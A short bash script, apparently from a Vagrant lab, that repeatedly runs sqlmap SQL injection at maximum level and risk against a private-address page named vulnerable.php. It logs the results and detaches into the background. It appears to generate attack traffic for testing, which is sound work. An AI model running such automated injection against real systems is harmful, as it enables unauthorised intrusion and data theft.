#!/bin/bash

TARGET="172.10.0.10"
INTERVAL=5
LOGFILE="/home/vagrant/SQL.log"

touch $LOGFILE

perform_injection() {
    while true
    do
    echo "Performing SQL injection on $TARGET..." >> $LOGFILE 2>&1
    sudo sqlmap -u "http://172.10.0.10/vulnerable.php?id=1" --level=5 --risk=3 --batch >> $LOGFILE 2>&1
    echo "Injection completed. Waiting for $INTERVAL seconds before next injection." >> $LOGFILE 2>&1
    sleep $INTERVAL
    done
}

perform_injection &


disown